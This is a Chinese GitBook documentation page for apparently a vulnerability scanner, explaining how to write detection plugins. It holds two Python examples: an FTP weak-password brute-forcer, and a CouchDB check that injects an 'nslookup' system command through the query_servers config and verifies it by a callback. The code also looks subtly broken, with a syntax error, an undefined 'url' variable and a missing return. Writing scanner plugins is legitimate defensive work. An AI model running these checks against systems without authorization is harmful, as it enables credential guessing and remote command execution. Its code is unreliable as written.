@@ -1,0 +1,580 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>4.2、插件编写 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.2">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="code.html" />
+    
+    
+    <link rel="prev" href="yuan-ma-wen-jian-jie-gou.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    序
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../01_introduction/introduction.html">
+            
+                <a href="../01_introduction/introduction.html">
+            
+                    
+                    一、简介
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    二、安装
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../02_install/windows.html">
+            
+                <a href="../02_install/windows.html">
+            
+                    
+                    2.1、Windows安装指南
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../02_install/linux.html">
+            
+                <a href="../02_install/linux.html">
+            
+                    
+                    2.2、Linux安装指南
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../02_install/Linux_AutoInstall.html">
+            
+                <a href="../02_install/Linux_AutoInstall.html">
+            
+                    
+                    2.3、Linux 一条命令安装
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../02_install/OSX.html">
+            
+                <a href="../02_install/OSX.html">
+            
+                    
+                    2.4、OSX安装指南
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../02_install/docker.html">
+            
+                <a href="../02_install/docker.html">
+            
+                    
+                    2.5、Docker安装指南
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    三、使用
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../03_use/liucheng.html">
+            
+                <a href="../03_use/liucheng.html">
+            
+                    
+                    3.1、启动关闭
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../03_use/search.html">
+            
+                <a href="../03_use/search.html">
+            
+                    
+                    3.2、搜索
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../03_use/task.html">
+            
+                <a href="../03_use/task.html">
+            
+                    
+                    3.3、任务
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../03_use/analysis.html">
+            
+                <a href="../03_use/analysis.html">
+            
+                    
+                    3.4、统计
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="../03_use/config.html">
+            
+                <a href="../03_use/config.html">
+            
+                    
+                    3.5、配置
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" >
+            
+                <span>
+            
+                    
+                    masscan
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" >
+            
+                <span>
+            
+                    
+                    四、开发
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="yuan-ma-wen-jian-jie-gou.html">
+            
+                <a href="yuan-ma-wen-jian-jie-gou.html">
+            
+                    
+                    4.1、源码文件结构
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.5.2" data-path="cha-jian-bian-xie.html">
+            
+                <a href="cha-jian-bian-xie.html">
+            
+                    
+                    4.2、插件编写
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="code.html">
+            
+                <a href="code.html">
+            
+                    
+                    4.3、源码解释
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="development.html">
+            
+                <a href="development.html">
+            
+                    
+                    4.4、二次开发
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >4.2、插件编写</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h2 id="&#x63D2;&#x4EF6;&#x7F16;&#x5199;">&#x63D2;&#x4EF6;&#x7F16;&#x5199;</h2>
+<p>&#x6F0F;&#x6D1E;&#x63D2;&#x4EF6;&#x652F;&#x6301;2&#x79CD;&#x7C7B;&#x578B;&#xFF0C;&#x6807;&#x793A;&#x7B26;&#x4E0E;python&#x811A;&#x672C;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5B98;&#x65B9;&#x63A8;&#x9001;&#x6E20;&#x9053;&#x5B89;&#x88C5;&#x6216;&#x8005;&#x81EA;&#x884C;&#x6DFB;&#x52A0;&#x3002;</p>
+<h3 id="json&#x6807;&#x793A;&#x7B26;">JSON&#x6807;&#x793A;&#x7B26;</h3>
+<p>&#x4F8B;&#x5B50;<br><img src="../img/05-1.png" alt="json&#x63D2;&#x4EF6;"></p>
+<h3 id="python&#x811A;&#x672C;">Python&#x811A;&#x672C;</h3>
+<p>&#x63D2;&#x4EF6;&#x6807;&#x51C6;&#x975E;&#x5E38;&#x7B80;&#x6D01;&#xFF0C;&#x53EA;&#x9700;&#x901A;&#x8FC7; get_plugin_info&#x65B9;&#x6CD5;&#x5B9A;&#x4E49;&#x63D2;&#x4EF6;&#x4FE1;&#x606F;&#xFF0C;check&#x51FD;&#x6570;&#x68C0;&#x6D4B;&#x6F0F;&#x6D1E;&#x5373;&#x53EF;&#x3002;</p>
+<pre><code class="lang-py"># coding:utf-8
+import ftplib
+def get_plugin_info():  # &#x63D2;&#x4EF6;&#x63CF;&#x8FF0;&#x4FE1;&#x606F;
+    plugin_info = {
+        &quot;name&quot;: &quot;FTP&#x5F31;&#x53E3;&#x4EE4;&quot;, 
+        &quot;info&quot;: &quot;&#x5BFC;&#x81F4;&#x654F;&#x611F;&#x4FE1;&#x606F;&#x6CC4;&#x9732;&#xFF0C;&#x4E25;&#x91CD;&#x60C5;&#x51B5;&#x53EF;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x5165;&#x4FB5;&#x63A7;&#x5236;&#x3002;&quot;,
+        &quot;level&quot;: &quot;&#x9AD8;&#x5371;&quot;,
+        &quot;type&quot;: &quot;&#x5F31;&#x53E3;&#x4EE4;&quot;,
+        &quot;author&quot;: &quot;wolf@YSRC&quot;,
+        &quot;url&quot;: &quot;&quot;,
+        &quot;keyword&quot;: &quot;server:ftp&quot;,  # &#x63A8;&#x8350;&#x641C;&#x7D22;&#x5173;&#x952E;&#x5B57;
+    }
+    return plugin_info
+def check(ip, port, timeout): # &#x6F0F;&#x6D1E;&#x68C0;&#x6D4B;&#x4EE3;&#x7801;
+    user_list = [&apos;ftp&apos;, &apos;www&apos;, &apos;admin&apos;, &apos;root&apos;, &apos;db&apos;, &apos;wwwroot&apos;, &apos;data&apos;, &apos;web&apos;]
+    for user in user_list:
+        for pass_ in PASSWORD_DIC:  # &#x5BC6;&#x7801;&#x5B57;&#x5178;&#x65E0;&#x9700;&#x5B9A;&#x4E49;&#xFF0C;&#x7A0B;&#x5E8F;&#x4F1A;&#x81EA;&#x52A8;&#x4E3A;&#x5176;&#x8D4B;&#x503C;&#x3002;
+            pass_ = str(pass_.replace(&apos;{user}&apos;, user))
+            try:
+                ftp = ftplib.FTP()
+                ftp.timeout = timeout
+                ftp.connect(ip, port)
+                ftp.login(user, pass_)
+                if pass_ == &apos;&apos;: pass_ = &quot;null&quot;
+                if user == &apos;ftp&apos; and pass_ == &apos;ftp: return u&quot;&#x53EF;&#x533F;&#x540D;&#x767B;&#x5F55;&quot;
+                return u&quot;&#x5B58;&#x5728;&#x5F31;&#x53E3;&#x4EE4;&#xFF0C;&#x8D26;&#x53F7;&#xFF1A;%s&#xFF0C;&#x5BC6;&#x7801;&#xFF1A;%s&quot; % (user, pass_)  # &#x6210;&#x529F;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#xFF0C;&#x5185;&#x5BB9;&#x663E;&#x793A;&#x5728;&#x626B;&#x63CF;&#x7ED3;&#x679C;&#x9875;&#x9762;&#x3002;
+            except:
+                pass
+</code></pre>
+<p>&#x6B64;&#x5916;&#x7CFB;&#x7EDF;&#x5185;&#x5D4C;&#x4E86;&#x8F85;&#x52A9;&#x9A8C;&#x8BC1;&#x529F;&#x80FD;:</p>
+<pre><code class="lang-py"><span class="hljs-keyword">import</span> urllib2
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_plugin_info</span><span class="hljs-params">()</span>:</span>  <span class="hljs-comment"># &#x63D2;&#x4EF6;&#x63CF;&#x8FF0;&#x4FE1;&#x606F;</span>
+    plugin_info = {
+        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;CouchDB&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&quot;</span>, 
+        <span class="hljs-string">&quot;info&quot;</span>: <span class="hljs-string">&quot;&#x5BFC;&#x81F4;&#x654F;&#x611F;&#x4FE1;&#x606F;&#x6CC4;&#x9732;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x901A;&#x8FC7;&#x63A7;&#x5236;&#x9762;&#x677F;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#xFF0C;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x88AB;&#x5165;&#x4FB5;&#x3002;&quot;</span>,
+        <span class="hljs-string">&quot;level&quot;</span>: <span class="hljs-string">&quot;&#x9AD8;&#x5371;&quot;</span>,
+        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&quot;</span>,
+        <span class="hljs-string">&quot;author&quot;</span>: <span class="hljs-string">&quot;wolf@YSRC&quot;</span>,
+        <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
+        <span class="hljs-string">&quot;keyword&quot;</span>: <span class="hljs-string">&quot;server:couchdb&quot;</span>,  <span class="hljs-comment"># &#x63A8;&#x8350;&#x641C;&#x7D22;&#x5173;&#x952E;&#x5B57;</span>
+    }
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_ver_ip</span><span class="hljs-params">()</span>:</span>
+    csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    csock.connect((<span class="hljs-string">&apos;8.8.8.8&apos;</span>, <span class="hljs-number">80</span>))
+    (addr, port) = csock.getsockname()
+    csock.close()
+    <span class="hljs-keyword">return</span> addr
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">random_str</span><span class="hljs-params">(len)</span>:</span>
+    str1=<span class="hljs-string">&quot;&quot;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len):
+        str1+=(random.choice(<span class="hljs-string">&quot;ABCDEFGH1234567890&quot;</span>))
+    <span class="hljs-keyword">return</span> str(str1)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span><span class="hljs-params">(ip,port,timeout)</span>:</span>
+    rand_str = random_str(<span class="hljs-number">8</span>)
+    cmd = random_str(<span class="hljs-number">4</span>)
+    server_ip = get_ver_ip()
+    req_list = [
+        [<span class="hljs-string">&quot;/_config/query_servers/%s&quot;</span>%(cmd),<span class="hljs-string">&apos;&quot;nslookup %s %s&gt;log&quot;&apos;</span>%(rand_str,server_ip)],
+        [<span class="hljs-string">&quot;/vultest123&quot;</span>,<span class="hljs-string">&apos;&apos;</span>],
+        [<span class="hljs-string">&quot;/vultest123/test&quot;</span>,<span class="hljs-string">&apos;{&quot;_id&quot;:&quot;safetest&quot;}&apos;</span>]
+    ]
+    <span class="hljs-keyword">for</span> req_info <span class="hljs-keyword">in</span> req_list:
+        <span class="hljs-keyword">try</span>:
+            request = urllib2.Request(url+req_info[<span class="hljs-number">0</span>],req_info[<span class="hljs-number">1</span>],timeout=timeout)
+            request.get_method = <span class="hljs-keyword">lambda</span>: <span class="hljs-string">&apos;PUT&apos;</span>
+            urllib2.urlopen(request)
+        <span class="hljs-keyword">except</span>:
+            <span class="hljs-keyword">pass</span>
+    <span class="hljs-keyword">try</span>:
+        req_exec = urllib2.Request(url + <span class="hljs-string">&quot;/vultest123/_temp_view?limit=11&quot;</span>,<span class="hljs-string">&apos;{&quot;language&quot;:&quot;%s&quot;,&quot;map&quot;:&quot;&quot;}&apos;</span>%(cmd))
+        req_exec.add_header(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/json&quot;</span>)
+        urllib2.urlopen(req_exec)
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">pass</span>
+    check = urllib2.urlopen(<span class="hljs-string">&quot;http://%s/%s&quot;</span>%(server_ip,rand_str)).read()
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;YES&apos;</span> <span class="hljs-keyword">in</span> check:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">u&quot;&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&quot;</span>
+</code></pre>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="yuan-ma-wen-jian-jie-gou.html" class="navigation navigation-prev " aria-label="Previous page: 4.1、源码文件结构">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="code.html" class="navigation navigation-next " aria-label="Next page: 4.3、源码解释">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"4.2、插件编写","level":"1.5.2","depth":2,"next":{"title":"4.3、源码解释","level":"1.5.3","depth":2,"path":"04_development/code.md","ref":"04_development/code.md","articles":[]},"previous":{"title":"4.1、源码文件结构","level":"1.5.1","depth":2,"path":"04_development/yuan-ma-wen-jian-jie-gou.md","ref":"04_development/yuan-ma-wen-jian-jie-gou.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"04_development/cha-jian-bian-xie.md","mtime":"2017-07-01T03:56:37.542Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-07-01T08:51:16.108Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
